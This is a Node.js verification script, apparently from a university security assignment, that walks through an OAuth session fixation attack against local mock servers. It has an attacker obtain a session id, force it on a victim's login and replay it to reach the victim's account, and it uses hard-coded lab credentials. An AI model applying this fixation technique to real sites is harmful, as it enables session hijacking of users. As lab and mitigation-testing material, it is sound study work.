// verify.js
// ISEC3004 Assignment 1 - OAuth Session Fixation: automated verification.
//
// Run (vulnerable):  node verify.js
// Run (mitigated) :  RP=http://localhost:7002 node verify.js
// Requires the mock provider (:7000) and the target RP to be running. Node 18+.
//
// This drives the whole flow headlessly with a small cookie jar so the
// exploit/mitigation can be checked repeatedly without a browser:
//   1. Attacker obtains a session id (A) from the RP.
//   2. Victim logs in via OAuth while fixated to sid=A (the vulnerable RP
//      adopts ?sid=A; the mitigated RP ignores it and regenerates on login).
//   3. Attacker replays sid=A against /account.
// Vulnerable RP -> attacker sees the victim's account (exploited).
// Mitigated RP  -> attacker gets 401 (secure).

const RP = process.env.RP || 'http://localhost:7001';
const PROVIDER = 'http://localhost:7000';

function sidFrom(setCookieList) {
  for (const c of setCookieList || []) {
    const m = /sid=([a-f0-9]+)/i.exec(c);
    if (m) return m[1];
  }
  return null;
}

// One hop that honours redirect:'manual', updates the jar, returns Location.
async function hop(url, jar) {
  const headers = {};
  if (jar.get('sid')) headers.cookie = `sid=${jar.get('sid')}`;
  const res = await fetch(url, { headers, redirect: 'manual' });
  const sid = sidFrom(res.headers.getSetCookie());
  if (sid) jar.set('sid', sid);
  return res.headers.get('location');
}

async function victimLogin(forcedSid) {
  const jar = new Map();
  if (forcedSid) jar.set('sid', forcedSid); // attacker's fixation attempt

  // Kick off OAuth (vulnerable RP reads ?sid; mitigated RP ignores it).
  const authorizeUrl = await hop(`${RP}/login${forcedSid ? `?sid=${forcedSid}` : ''}`, jar);
  const u = new URL(authorizeUrl);
  const state = u.searchParams.get('state');
  const redirectUri = u.searchParams.get('redirect_uri');

  // Sign in with the provider credentials and approve -> redirected back to the
  // RP callback. (The relying party never sees these credentials.)
  const approveRes = await fetch(`${PROVIDER}/authorize/approve`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    redirect: 'manual',
    body: `username=alice&password=password123`
      + `&redirect_uri=${encodeURIComponent(redirectUri)}&state=${encodeURIComponent(state)}`,
  });
  const callbackUrl = approveRes.headers.get('location');

  // Complete the callback on the RP.
  await hop(callbackUrl, jar);
  return jar;
}

async function accountStatus(sid) {
  const res = await fetch(`${RP}/account`, { headers: { cookie: `sid=${sid}` } });
  const body = await res.text();
  return { status: res.status, body };
}

(async () => {
  console.log(`\n=== Verifying ${RP} ===`);

  // 1. Attacker acquires a session id from the RP.
  const first = await fetch(`${RP}/`, { redirect: 'manual' });
  const attackerSid = sidFrom(first.headers.getSetCookie());
  console.log(`attacker session id (fixation target): ${attackerSid}`);

  // 2. Victim logs in while fixated to the attacker's sid.
  const victimJar = await victimLogin(attackerSid);
  const victimSid = victimJar.get('sid');
  console.log(`victim session id after login:         ${victimSid}`);
  console.log(`session id changed on login?           ${victimSid !== attackerSid ? 'YES (regenerated)' : 'NO (reused)'}`);

  // Sanity: the victim themselves is logged in.
  const victim = await accountStatus(victimSid);
  console.log(`victim /account:                       HTTP ${victim.status}`);

  // 3. Attacker replays the fixated sid.
  const attacker = await accountStatus(attackerSid);
  console.log(`attacker /account (replaying sid):     HTTP ${attacker.status}`);

  const exploited = attacker.status === 200 && /victim@example\.com/.test(attacker.body);
  console.log('\nRESULT:');
  if (exploited) {
    console.log('  ❌ EXPLOITED - attacker shares the victim\'s authenticated session (expected for the VULNERABLE RP).');
  } else {
    console.log('  ✅ SECURE - attacker\'s fixated session is not authenticated (expected for the MITIGATED RP).');
  }
})().catch(e => {
  console.error('verify.js error:', e.message);
  console.error('Are the provider (:7000) and the target RP running?');
  process.exit(1);
});
